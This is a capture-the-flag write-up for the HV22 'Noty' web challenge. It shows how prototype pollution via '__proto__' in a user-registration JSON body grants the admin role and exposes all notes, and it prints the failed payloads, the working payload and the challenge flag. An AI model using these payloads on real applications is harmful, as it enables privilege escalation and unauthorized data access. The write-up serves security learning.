# [HV22.13] Noty

<table>
  <tr>
    <th>Categories</th>
    <td>Web Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

## Description
After the previous fiasco with multiple bugs in Notme (some intended and some not), Santa released a now truly secure note taking app for you. Introducing: Noty, a fixed version of Notme.

Also Santa makes sure that this service runs on green energy. No pollution from this app ;)

## Solution
Noty - not again.. :D

Noty is a fixed version of Notme - even the unintended solution has been fixed this time.

After some struggling, `mcia` pointed me to the obvious hint in the description.
This challenge was about some "pollution" attack.
There are two that are known:
- Query/request parameter pollution ([explained here](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications)).
- Prototype pollution on a JS application (client- and server-side).

Since there are now query parameters used in this webapp and the webserver seemingly being ExpressJS, I went for the latter.

Several attempts later, each one breaking the application, because new properties were added to all objects, I managed to find the right place to pollute, which was the user registration/creation endpoint.

Here are a few attempts, each crashing the application:

Try overriding the password or the hash of it. This one added `username` and `password` properties to all objects on the server.
```json
{
"username":"test3",
"password": "test",
"__proto__": {
    "username":"test4",
    "password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
}}
```

Try overriding the user's ID. This one added an `id` property to all objects.
```json
{
"username":"test2",
"password": "test",
"__proto__": {
    "id": 1337
}}
```

Be desperate:
```json
{"username":"test2","password":"test", "__proto__":{"toString": "blah"}}  

=> {"error":"Object.prototype.toString.call is not a function"}
```

**Final solution**: Grant myself the `admin` role.

Create a user:
```json
# Request payload
{"username":"test1","password":"test", "__proto__": {"role": "admin"}}

# Response
=> {"id":2,"username":"test1","password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","role":"admin","updatedAt":"2022-12-13T21:09:23.730Z","createdAt":"2022-12-13T21:09:23.730Z"}
```

And then, using the returned session, list all notes 🎉:
```json
# Request
GET /api/note/all HTTP/2
Cookie: ...

# Response
[{
    "id":1337,
    "note":"HV22{P0luT1on_1S_B4d_3vERyWhere}",
    "userId":1337,
    "createdAt":"2022-12-13T21:08:02.730Z",
    "updatedAt":"2022-12-13T21:08:02.730Z"
},
{
    "id":1,
    "note":"asdfsdfsaf",
    "userId":1,
    "createdAt":"2022-12-13T21:08:26.254Z",
    "updatedAt":"2022-12-13T21:08:26.254Z"
}]
```

## Links
- https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7?gi=5ea0c35d5552
- https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
- https://github.com/var77/proto-pollution-owasp-yerevan
- https://learn.snyk.io/lessons/prototype-pollution/javascript/
- https://hackernoon.com/how-to-exploit-prototype-pollution

## Flag
```
HV22{P0luT1on_1S_B4d_3vERyWhere}
```
